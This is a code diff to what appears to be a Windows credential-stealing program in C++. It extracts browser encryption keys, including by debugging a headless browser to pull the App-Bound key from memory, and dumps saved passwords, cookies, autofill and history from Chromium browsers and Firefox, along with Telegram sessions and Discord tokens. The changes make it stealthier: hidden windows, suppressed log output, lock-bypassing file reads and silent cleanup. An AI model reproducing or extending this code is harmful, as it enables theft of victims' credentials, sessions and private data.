@@ -13,6 +13,9 @@
 #include <cstring>
 #include <regex>
 #include <set>
+#include <cstdio>
+#include <cctype>
+#include <shellapi.h>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -23,6 +26,48 @@
  #pragma comment(lib, "uuid.lib")
 
 namespace fs = std::filesystem;
+
+std::string to_narrow_string(const wchar_t* w_str) {
+    if (!w_str) return "";
+    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return "";
+    std::string res(size, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
+std::string path_to_uri(const fs::path& p) {
+    std::string path_str = to_narrow_string(p.wstring().c_str());
+    std::string encoded = "";
+    for (unsigned char c : path_str) {
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == '/' || c == ':') {
+            encoded += (char)c;
+        } else if (c == '\\') {
+            encoded += '/';
+        } else {
+            char buf[4];
+            snprintf(buf, sizeof(buf), "%%%02X", c);
+            encoded += buf;
+        }
+    }
+    return "file:///" + encoded + "?mode=ro&nolock=1";
+}
+
+std::string read_file_locked(const fs::path& p) {
+    std::string content;
+    HANDLE h_file = CreateFileW(p.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h_file != INVALID_HANDLE_VALUE) {
+        DWORD size = GetFileSize(h_file, NULL);
+        if (size > 0 && size != INVALID_FILE_SIZE) {
+            content.resize(size);
+            DWORD read = 0;
+            if (!ReadFile(h_file, &content[0], size, &read, NULL)) content.clear();
+        }
+        CloseHandle(h_file);
+    }
+    return content;
+}
 
 struct BrowserConfig {
     std::string name;
@@ -170,23 +215,6 @@ int main() {
         }
     };
 
-    kill_processes_by_name("browser.exe");
-    kill_processes_by_name("chrome.exe");
-    kill_processes_by_name("msedge.exe");
-    kill_processes_by_name("brave.exe");
-    kill_processes_by_name("opera.exe");
-    kill_processes_by_name("launcher.exe");
-    kill_processes_by_name("firefox.exe");
-    kill_processes_by_name("waterfox.exe");
-    kill_processes_by_name("librewolf.exe");
-    kill_processes_by_name("thunderbird.exe");
-    kill_processes_by_name("discord.exe");
-    kill_processes_by_name("Discord.exe");
-    kill_processes_by_name("DiscordCanary.exe");
-    kill_processes_by_name("DiscordPTB.exe");
-    kill_processes_by_name("Lightcord.exe");
-    kill_processes_by_name("Telegram.exe");
-
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
 
@@ -196,11 +224,8 @@ int main() {
         }
 
         if (user_data_dir.empty()) {
-            std::cout << "User data directory not found for " << config.name << ", skipping..." << std::endl;
             continue;
         }
-
-        std::cout << "Processing " << config.name << "..." << std::endl;
 
         std::vector<uint8_t> v10_key;
         bool is_dpapi = false;
@@ -215,17 +240,14 @@ int main() {
 
         if (has_key) {
             if (is_dpapi && !config.has_abe) {
-                std::cout << "Found DPAPI key for " << config.name << ", extracting immediately..." << std::endl;
                 extract_all_profiles_data({}, config, user_data_dir);
                 should_debug = false;
             } else if (!is_dpapi && !config.has_abe) {
-                std::cout << "Found ABE key for " << config.name << ", extracting immediately..." << std::endl;
                 extract_all_profiles_data(v10_key, config, user_data_dir);
                 should_debug = false;
             }
         } else if (!config.has_abe) {
             // For Outlook or other non-ABE, try extraction even if Local State key isn't found (might use direct DPAPI)
-            std::cout << "No Local State key found for " << config.name << ", attempting direct DPAPI extraction..." << std::endl;
             extract_all_profiles_data({}, config, user_data_dir);
             should_debug = false;
         }
@@ -286,27 +308,45 @@ int main() {
         }
 
         if (exe_path.empty()) {
-            std::cout << "Executable not found for " << config.name << ", skipping debugger method..." << std::endl;
             continue;
         }
 
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = { 0 };
-        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";
+
+        fs::path output_root = fs::absolute(config.output_dir);
+        fs::create_directories(output_root);
+        std::wstring unique_data_dir = (output_root / (L"tmp_" + std::wstring(config.name.begin(), config.name.end()) + L"_" + std::to_wstring(GetTickCount64()))).wstring();
+        fs::create_directories(unique_data_dir);
+
+        // Copy Local State using read_file_locked to avoid sharing violations
+        fs::path src_local_state = fs::path(user_data_dir) / L"Local State";
+        std::string local_state_content = read_file_locked(src_local_state);
+        if (!local_state_content.empty()) {
+            std::ofstream ofs(fs::path(unique_data_dir) / L"Local State", std::ios::binary);
+            ofs.write(local_state_content.data(), local_state_content.size());
+        }
+
+        std::wstring cmd_line = L"\"" + exe_path + L"\" --headless --no-first-run --no-default-browser-check --disable-gpu --mute-audio --disable-breakpad --disable-logging --user-data-dir=\"" + unique_data_dir + L"\"";
 
         std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
         cmd_buffer.push_back(0);
 
         if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE,
-            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+            DEBUG_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
 
-            std::cout << "Started " << config.name << " with PID: " << pi.dwProcessId << std::endl;
             debug_loop(pi.hProcess, config, user_data_dir);
 
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
-        } else {
-            std::cerr << "Failed to create " << config.name << " process. Error: " << GetLastError() << std::endl;
+
+            // Cleanup temp user data dir
+            SHFILEOPSTRUCTW fileOp = { 0 };
+            fileOp.wFunc = FO_DELETE;
+            unique_data_dir.push_back(L'\0'); // Double null terminator
+            fileOp.pFrom = unique_data_dir.c_str();
+            fileOp.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_SILENT;
+            SHFileOperationW(&fileOp);
         }
     }
 
@@ -477,10 +517,8 @@ std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use
 
 bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
     fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
-    std::ifstream ifs(local_state_path);
-    if (!ifs.is_open()) return false;
-
-    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+    std::string content = read_file_locked(local_state_path);
+    if (content.empty()) return false;
     size_t pos = content.find("\"encrypted_key\":\"");
     if (pos == std::string::npos) return false;
     pos += 17;
@@ -670,7 +708,6 @@ size_t find_target_address(HANDLE h_process, void* base_addr, const std::string&
     }
 
     if (string_va == 0) {
-        std::cout << "Could not find target string in " << browser_name << "'s .rdata section" << std::endl;
         return 0;
     }
 
@@ -686,7 +723,6 @@ size_t find_target_address(HANDLE h_process, void* base_addr, const std::string&
                     size_t target = (size_t)((int64_t)rip + offset);
 
                     if (target == string_va) {
-                        std::cout << "Found matching LEA instruction at 0x" << std::hex << section_start + pos << " for " << browser_name << std::dec << std::endl;
                         return section_start + pos;
                     }
                 }
@@ -694,7 +730,6 @@ size_t find_target_address(HANDLE h_process, void* base_addr, const std::string&
         }
     }
 
-    std::cout << "Could not find matching LEA instruction in " << browser_name << "'s .text section" << std::endl;
     return 0;
 }
 
@@ -710,11 +745,13 @@ void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstrin
                     std::wstring path = buffer;
                     std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
                     if (path.find(dll_name_w) != std::wstring::npos) {
-                        std::cout << "Found " << config.dll_name << " at " << std::hex << debug_event.u.LoadDll.lpBaseOfDll << std::dec << std::endl;
-                        target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
+                        HANDLE h_event_process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, debug_event.dwProcessId);
+                        if (h_event_process) {
+                            target_address = find_target_address(h_event_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
+                            CloseHandle(h_event_process);
+                        }
                         if (target_address != 0) {
                             std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
-                            std::cout << "Setting hardware breakpoints for " << config.name << " on " << threads.size() << " threads" << std::endl;
                             for (uint32_t thread_id : threads) {
                                 set_hardware_breakpoint(thread_id, target_address);
                             }
@@ -732,10 +769,13 @@ void debug_loop(HANDLE h_process, const BrowserConfig& config, const std::wstrin
             case EXCEPTION_DEBUG_EVENT: {
                 if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
                     if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
-                        std::cout << "Target breakpoint hit!" << std::endl;
-                        if (extract_key(debug_event.dwThreadId, h_process, config, user_data_dir)) {
-                            clear_hardware_breakpoints(debug_event.dwProcessId);
-                            TerminateProcess(h_process, 0);
+                        HANDLE h_event_process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, debug_event.dwProcessId);
+                        if (h_event_process) {
+                            if (extract_key(debug_event.dwThreadId, h_event_process, config, user_data_dir)) {
+                                clear_hardware_breakpoints(debug_event.dwProcessId);
+                                TerminateProcess(h_event_process, 0);
+                            }
+                            CloseHandle(h_event_process);
                         }
                     }
                     set_resume_flag(debug_event.dwThreadId);
@@ -776,7 +816,6 @@ bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& conf
                     bool all_zero = true;
                     for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
                     if (!all_zero) {
-                        std::cout << "Extracted Master Key from 0x" << std::hex << data_ptr << std::dec << std::endl;
                         extract_all_profiles_data(key, config, user_data_dir);
                         success = true;
                         break;
@@ -799,11 +838,9 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
     }
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -824,7 +861,6 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -832,11 +868,9 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
     if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -860,7 +894,6 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -872,11 +905,9 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
         fs::path db_path = profile_path / db_name;
         if (!fs::exists(db_path)) continue;
 
-        fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-        fs::copy(db_path, temp_db);
-
+        std::string uri = path_to_uri(db_path);
         sqlite3* db;
-        if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
             sqlite3_stmt* stmt;
 
             if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
@@ -915,7 +946,6 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
             }
             sqlite3_close(db);
         }
-        fs::remove(temp_db);
     }
 }
 
@@ -923,11 +953,9 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
     fs::path db_path = profile_path / "History";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -942,7 +970,6 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
@@ -965,7 +992,6 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
 
             if (is_profile) {
                 std::string profile_name = entry.path().filename().string();
-                std::cout << "Extracting data for profile: " << profile_name << std::endl;
                 fs::path profile_output = output_root / profile_name;
                 fs::create_directories(profile_output);
 
@@ -976,30 +1002,19 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
             }
         }
     }
-    std::cout << "Extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
+    std::cout << config.name << " başarılı" << std::endl;
 }
 
 
-std::string to_narrow_string(const wchar_t* w_str) {
-    if (!w_str) return "";
-    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
-    if (size <= 0) return "";
-    std::string res(size, '\0');
-    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
-    if (!res.empty() && res.back() == '\0') res.pop_back();
-    return res;
-}
 // Final check
 
 void extract_firefox_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "cookies.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_cookies_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host, name, value, path FROM moz_cookies";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1015,18 +1030,15 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "places.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_history_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1041,18 +1053,15 @@ void extract_firefox_history(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "formhistory.sqlite";
     if (!fs::exists(db_path)) return;
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_autofill_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
-
+    std::string uri = path_to_uri(db_path);
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
+    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT fieldname, value FROM moz_formhistory";
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
@@ -1066,7 +1075,6 @@ void extract_firefox_autofill(const fs::path& profile_path, const fs::path& outp
         }
         sqlite3_close(db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir);
@@ -1077,11 +1085,16 @@ void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_
     fs::create_directories(output_root);
 
     fs::path nss_dir;
+    std::vector<std::wstring> search_roots = get_search_roots();
     for (const auto& path : config.exe_paths) {
-        if (fs::exists(path)) {
-            nss_dir = fs::path(path).parent_path();
-            break;
+        for (const auto& root : search_roots) {
+            fs::path full_path = fs::path(root) / path;
+            if (fs::exists(full_path)) {
+                nss_dir = full_path.parent_path();
+                break;
+            }
         }
+        if (!nss_dir.empty()) break;
     }
 
     for (const auto& entry : fs::directory_iterator(user_data)) {
@@ -1089,7 +1102,6 @@ void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_
             fs::path profile_path = entry.path();
             if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                 std::string profile_name = profile_path.filename().string();
-                std::cout << "Extracting Firefox data for profile: " << profile_name << std::endl;
                 fs::path profile_output = output_root / profile_name;
                 fs::create_directories(profile_output);
 
@@ -1103,7 +1115,7 @@ void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_
             }
         }
     }
-    std::cout << "Firefox extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
+    std::cout << config.name << " başarılı" << std::endl;
 }
 
 typedef enum {
@@ -1203,9 +1215,8 @@ void extract_telegram_session() {
                 }
             }
         }
-        std::cout << "Telegram session extraction complete. Saved to Telegram/tdata" << std::endl;
+        std::cout << "Telegram başarılı" << std::endl;
     } catch (const std::exception& e) {
-        std::cerr << "Telegram extraction error: " << e.what() << std::endl;
     }
 }
 
@@ -1228,10 +1239,8 @@ void extract_discord_tokens(const std::wstring& discord_path_w, const std::strin
     for (const auto& entry : fs::directory_iterator(leveldb_path)) {
         std::string ext = entry.path().extension().string();
         if (ext == ".log" || ext == ".ldb") {
-            std::ifstream ifs(entry.path(), std::ios::binary);
-            if (ifs) {
-                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-
+            std::string content = read_file_locked(entry.path());
+            if (!content.empty()) {
                 // Scan for encrypted tokens
                 auto enc_begin = std::sregex_iterator(content.begin(), content.end(), enc_regex);
                 auto enc_end = std::sregex_iterator();
@@ -1268,7 +1277,7 @@ void extract_discord_tokens(const std::wstring& discord_path_w, const std::strin
         for (const auto& token : tokens) {
             ofs << token << "\n";
         }
-        std::cout << "Extracted " << tokens.size() << " Discord tokens from " << output_name << std::endl;
+        std::cout << output_name << " başarılı" << std::endl;
     }
 }
 
@@ -1281,9 +1290,8 @@ void extract_firefox_passwords(const fs::path& profile_path, const fs::path& out
         if (slot) {
             if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                 fs::path logins_path = profile_path / "logins.json";
-                std::ifstream ifs(logins_path);
-                if (ifs.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+                std::string content = read_file_locked(logins_path);
+                if (!content.empty()) {
                     std::ofstream ofs(output_dir / "passwords.txt");
 
                     size_t pos = 0;
